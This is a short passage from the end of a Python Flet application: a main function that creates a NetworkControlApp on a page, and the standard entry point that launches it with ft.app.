# =====================================================================

def main(page: ft.Page):
    app = NetworkControlApp(page)

if __name__ == "__main__":
    ft.app(target=main)
